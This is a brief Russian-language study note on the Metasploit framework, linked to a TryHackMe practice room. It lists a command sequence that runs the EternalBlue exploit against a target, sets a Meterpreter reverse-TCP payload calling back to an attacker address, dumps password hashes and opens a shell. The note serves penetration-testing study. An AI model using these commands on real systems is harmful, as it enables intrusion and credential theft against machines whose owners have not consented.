==**Metasploit**== — это мощный фреймворк для тестирования на проникновение (пентеста), разработки эксплойтов и исследования уязвимостей. Он создан **HD Moore** в 2003 году, а сейчас принадлежит компании **Rapid7**

[TryHackMe | Metasploit: Introduction](https://tryhackme.com/room/metasploitintro) - можно зайти и повторить 

%% Поиск модулей %%
search cve:2023 type:exploit

%% Использование эксплойта %%
use exploit/windows/smb/ms17_010_eternalblue

%% Настройка параметров %%
set RHOSTS 192.168.1.1  
set PAYLOAD windows/x64/meterpreter/reverse_tcp  
set LHOST 192.168.1.100

%% Запуск атаки %%
exploit

%% После успешного проникновения (meterpreter) %%
getuid              %%  Проверка прав   %%
hashdump       %% Дамп хешей паролей   %%
screenshot       %% Скриншот экрана   %%
shell                 %% Открыть командную оболочку %%
